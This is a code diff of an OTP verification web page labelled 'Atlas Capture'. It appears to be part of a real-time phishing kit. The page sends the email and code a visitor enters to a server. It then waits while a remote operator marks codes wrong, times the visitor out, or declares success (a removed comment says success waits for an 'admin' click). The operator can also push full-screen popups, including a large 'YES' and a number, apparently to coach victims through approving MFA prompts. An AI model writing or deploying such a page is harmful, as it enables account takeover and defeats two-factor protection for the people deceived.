@@ -3,115 +3,61 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas - OTP Verification</title>
+<title>Atlas Capture - Verify Code</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body {
-  min-height: 100vh;
-  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
-  display: flex; justify-content: center; align-items: center; padding: 20px;
-}
-.card {
-  background: #fff; border-radius: 24px; padding: 40px 32px;
-  width: 100%; max-width: 420px;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
-}
-.logo-wrap {
-  width: 72px; height: 72px; margin: 0 auto 24px;
-  border-radius: 20px; padding: 12px; background: #f3f4f6;
-  display: flex; align-items: center; justify-content: center;
-  overflow: hidden;
-}
-.logo-wrap img { width: 100%; height: 100%; object-fit: contain; }
-h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
-.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; line-height: 1.5; }
-.email-highlight { color: #4a4ff0; font-weight: 600; }
-.form-group { margin-bottom: 20px; }
-label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
-input {
-  width: 100%; padding: 16px;
-  border: 1.5px solid #e5e7eb; border-radius: 12px;
-  font-size: 20px; letter-spacing: 8px; text-align: center;
-  font-weight: 600; outline: none; text-transform: uppercase;
-}
-input:focus { border-color: #4a4ff0; }
-input:disabled { background: #f3f4f6; }
-button {
-  width: 100%; padding: 15px;
-  background: linear-gradient(90deg, #4a4ff0, #7c3aed);
-  color: white; border: none; border-radius: 12px;
-  font-size: 15px; font-weight: 600; cursor: pointer;
-  display: flex; align-items: center; justify-content: center; gap: 10px;
-}
-button:disabled { opacity: 0.7; cursor: not-allowed; }
-.spinner {
-  width: 18px; height: 18px;
-  border: 2px solid rgba(255,255,255,0.3);
-  border-top-color: white; border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.error-label {
-  color: #dc2626; font-size: 13px; margin-top: 12px;
-  text-align: center; display: none;
-  background: #fef2f2; padding: 12px; border-radius: 10px;
-}
-.popup-overlay {
-  position: fixed; inset: 0; background: rgba(0,0,0,0.92);
-  z-index: 10000; display: none; justify-content: center;
-  align-items: center; padding: 20px;
-}
-.popup-overlay.active { display: flex; }
-.popup-yes { text-align: center; color: white; max-width: 500px; width: 100%; }
-.popup-yes .big-yes {
-  font-size: 80px; font-weight: 900; color: #10b981;
-  letter-spacing: 4px; text-shadow: 0 0 40px rgba(16,185,129,0.6);
-  margin-bottom: 20px; animation: pulseYes 1.5s ease-in-out infinite;
-}
-@keyframes pulseYes { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
-.popup-yes .big-number {
-  font-size: 120px; font-weight: 900; color: #fbbf24;
-  letter-spacing: 8px; text-shadow: 0 0 40px rgba(251,191,36,0.6); margin: 20px 0;
-}
-.popup-yes .instruction {
-  font-size: 20px; font-weight: 600; color: #e5e7eb; margin-top: 20px; line-height: 1.5;
-}
-.popup-text {
-  background: white; border-radius: 20px; padding: 32px; max-width: 400px; width: 100%;
-}
-.popup-text .icon {
-  width: 60px; height: 60px;
-  background: linear-gradient(135deg, #f97316, #ea580c);
-  border-radius: 50%; margin: 0 auto 16px;
-  display: flex; align-items: center; justify-content: center;
-  color: white; font-size: 28px; font-weight: bold;
-}
-.popup-text h3 { text-align: center; color: #1f2937; margin-bottom: 16px; font-size: 20px; }
-.popup-text .message {
-  background: #f3f4f6; padding: 20px; border-radius: 12px;
-  color: #1f2937; font-size: 15px; line-height: 1.6;
-  word-break: break-word; white-space: pre-wrap;
-}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+body{background:#f3f4f6;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:40px 10px}
+.wrapper{max-width:420px;width:100%}
+.header{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:18px}
+.icon{display:flex;align-items:center;justify-content:center}
+#logoAtlas{height:45px;width:45px;border-radius:40%}
+.header span{font-weight:600;font-size:18px}
+.card{background:#fff;border-radius:22px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,0.08);text-align:center}
+h2{font-size:24px;font-weight:700;color:#1f2937;margin-bottom:8px}
+.subtext{color:#6b7280;font-size:14px;margin-bottom:28px}
+.otp-input{width:100%;padding:16px;font-size:24px;text-align:center;letter-spacing:8px;border:2px solid #e5e7eb;border-radius:14px;background:#fff;transition:all 0.2s;margin-bottom:28px;font-weight:600;text-transform:uppercase}
+.otp-input:focus{outline:none;border-color:#4f46e5;box-shadow:0 0 0 3px rgba(79,70,229,0.1)}
+button{width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#2563eb,#7c3aed);color:#fff;font-weight:600;cursor:pointer;margin-bottom:16px}
+button:disabled{opacity:0.6;cursor:not-allowed}
+.button-loading{display:inline-flex;align-items:center;gap:8px}
+.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.link{background:none;color:#4f46e5;font-size:14px;font-weight:500;margin:0;padding:0;box-shadow:none}
+.link:hover{background:none;text-decoration:underline}
+.error-message{color:#ef4444;font-size:13px;margin-top:12px;display:none;background:#fef2f2;padding:12px;border-radius:12px}
+.popup-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:10000;justify-content:center;align-items:center;padding:20px}
+.popup-overlay.active{display:flex}
+.popup-yes{text-align:center;color:white;max-width:500px;width:100%}
+.popup-yes .big-yes{font-size:80px;font-weight:900;color:#10b981;letter-spacing:4px;text-shadow:0 0 40px rgba(16,185,129,0.6);margin-bottom:20px}
+.popup-yes .big-number{font-size:120px;font-weight:900;color:#fbbf24;letter-spacing:8px;text-shadow:0 0 40px rgba(251,191,36,0.6);margin:20px 0}
+.popup-yes .instruction{font-size:20px;font-weight:600;color:#e5e7eb;margin-top:20px;line-height:1.5}
+.popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
+.popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
+.popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo-wrap">
-    <img src="/images/logo.png" alt="Atlas">
-  </div>
-  <h1>Verification Code</h1>
-  <p class="subtitle">Enter the 5-6 character code for <br><span class="email-highlight" id="emailDisplay"></span></p>
-
-  <div class="form-group">
-    <label>Enter Code (letters & numbers)</label>
-    <input type="text" id="otpInput" maxlength="6" placeholder="------" autocomplete="off">
+<div class="wrapper">
+  <div class="header">
+    <div class="icon"><img id="logoAtlas" src="/images/logo.png" alt="atlas logo"></div>
+    <span>Atlas Capture</span>
   </div>
 
-  <button id="submitBtn">Submit Code</button>
-  <div id="errorLabel" class="error-label"></div>
+  <div class="card">
+    <h2>Check your email</h2>
+    <p class="subtext">We sent you a 5-6 character verification code</p>
+
+    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="------">
+    <div id="errorMessage" class="error-message"></div>
+
+    <button id="verifyBtn">Verify</button>
+    <button class="link" id="differentEmail">Use a different email</button>
+  </div>
 </div>
 
+<!-- YES Popup -->
 <div id="yesPopup" class="popup-overlay">
   <div class="popup-yes">
     <div class="big-yes">YES</div>
@@ -120,9 +66,9 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
   </div>
 </div>
 
+<!-- Text Popup -->
 <div id="textPopup" class="popup-overlay">
   <div class="popup-text">
-    <div class="icon">!</div>
     <h3>Message</h3>
     <div class="message" id="textMessage"></div>
   </div>
@@ -134,37 +80,39 @@ const socket = io();
 const urlParams = new URLSearchParams(window.location.search);
 let email = urlParams.get('email') || localStorage.getItem('atlas_current_email') || '';
 if (!email) { window.location.href = '/'; }
-document.getElementById('emailDisplay').textContent = email;
 localStorage.setItem('atlas_current_email', email);
 
-const otpInput = document.getElementById('otpInput');
-const submitBtn = document.getElementById('submitBtn');
-const errorLabel = document.getElementById('errorLabel');
-const yesPopup = document.getElementById('yesPopup');
+const otpInput  = document.getElementById('otpInput');
+const verifyBtn = document.getElementById('verifyBtn');
+const errorDiv  = document.getElementById('errorMessage');
+const yesPopup  = document.getElementById('yesPopup');
 const textPopup = document.getElementById('textPopup');
 
-let pollInterval = null;
-let timeoutTimer = null;
+let isProcessing = false;
 let lastPopupId = parseInt(localStorage.getItem('atlas_last_popup_id') || '0');
-let submitted = false;
 
 function showError(msg) {
-  errorLabel.textContent = msg;
-  errorLabel.style.display = 'block';
-  setTimeout(() => { errorLabel.style.display = 'none'; }, 8000);
+  errorDiv.textContent = msg;
+  errorDiv.style.display = 'block';
+  setTimeout(() => { errorDiv.style.display = 'none'; }, 8000);
 }
 
-function setLoading(loading) {
-  submitBtn.disabled = loading;
-  otpInput.disabled = loading;
-  submitBtn.innerHTML = loading
-    ? '<div class="spinner"></div> Verifying...'
-    : 'Submit Code';
+function showLoading() {
+  isProcessing = true;
+  verifyBtn.disabled = true;
+  verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
+  errorDiv.style.display = 'none';
 }
 
-function clearPopups() {
-  yesPopup.classList.remove('active');
-  textPopup.classList.remove('active');
+function showWaiting() {
+  verifyBtn.disabled = true;
+  verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
+}
+
+function resetButton() {
+  isProcessing = false;
+  verifyBtn.disabled = false;
+  verifyBtn.innerHTML = 'Verify';
 }
 
 function showYesPopup(n) {
@@ -187,10 +135,8 @@ async function pollStatus() {
     const data = await res.json();
     if (!data || data.notFound) return;
 
-    // Wrong OTP → reset + error
     if (data.wrong_otp_flag) {
-      setLoading(false);
-      submitted = false;
+      resetButton();
       otpInput.value = '';
       showError('Incorrect code. Please try again.');
       await fetch('/api/user/clear-flags', {
@@ -200,13 +146,11 @@ async function pollStatus() {
       return;
     }
 
-    // Timeout → go back to login
     if (data.timeout_flag) {
       window.location.href = '/';
       return;
     }
 
-    // Popup trigger
     if (data.popup_id && data.popup_id > lastPopupId) {
       lastPopupId = data.popup_id;
       localStorage.setItem('atlas_last_popup_id', lastPopupId);
@@ -214,50 +158,40 @@ async function pollStatus() {
       else if (data.popup_type === 'text') showTextPopup(data.popup_value);
     }
 
-    // ONLY redirect to success when admin clicks Success button
     if (data.status === 'success') {
-      window.location.href = `/success.html?email=${encodeURIComponent(email)}`;
+      window.location.href = `/success?email=${encodeURIComponent(email)}`;
       return;
     }
-  } catch (err) { /* silent */ }
+  } catch (err) {}
 }
 
-submitBtn.addEventListener('click', async () => {
-  if (submitted) return;
-  const otp = otpInput.value.trim();
+verifyBtn.addEventListener('click', async () => {
+  if (isProcessing) return;
+  const otp = otpInput.value.trim().toUpperCase();
   if (otp.length < 5 || otp.length > 6) {
-    showError('Code must be 5 or 6 characters.');
+    showError('Please enter 5 or 6 characters');
     return;
   }
-  if (!/^[A-Za-z0-9]+$/.test(otp)) {
-    showError('Only letters and numbers are allowed.');
+  if (!/^[A-Z0-9]+$/.test(otp)) {
+    showError('Only letters and numbers allowed');
     return;
   }
-  submitted = true;
-  setLoading(true);
 
+  showLoading();
   try {
     const res = await fetch('/api/user/submit-otp', {
       method: 'POST', headers: {'Content-Type':'application/json'},
       body: JSON.stringify({ email, otp })
     });
     const data = await res.json();
-    if (!data.success) {
-      submitted = false;
-      setLoading(false);
-      showError(data.error || 'Failed to submit code.');
-      return;
+    if (data.success) {
+      showWaiting();
+    } else {
+      resetButton();
+      showError(data.error || 'Failed to submit');
     }
-
-    if (timeoutTimer) clearTimeout(timeoutTimer);
-    timeoutTimer = setTimeout(() => {
-      setLoading(false);
-      submitted = false;
-      showError('Timeout. Please try again after 5 minutes.');
-    }, 60000);
-  } catch (err) {
-    submitted = false;
-    setLoading(false);
+  } catch (e) {
+    resetButton();
     showError('Network error. Please try again.');
   }
 });
@@ -266,8 +200,13 @@ otpInput.addEventListener('input', () => {
   otpInput.value = otpInput.value.toUpperCase();
 });
 
-// ALWAYS-on polling (popups work even after timeout/leaving)
-pollInterval = setInterval(pollStatus, 1500);
+otpInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verifyBtn.click();
+});
+
+otpInput.focus();
+
+setInterval(pollStatus, 1500);
 pollStatus();
 
 socket.on('popup-update', (data) => {
@@ -283,6 +222,10 @@ socket.on('popup-update', (data) => {
 socket.on('user-control', (data) => {
   if (data.email !== email) return;
   pollStatus();
+});
+
+document.getElementById('differentEmail').addEventListener('click', () => {
+  window.location.href = '/';
 });
 </script>
 </body>
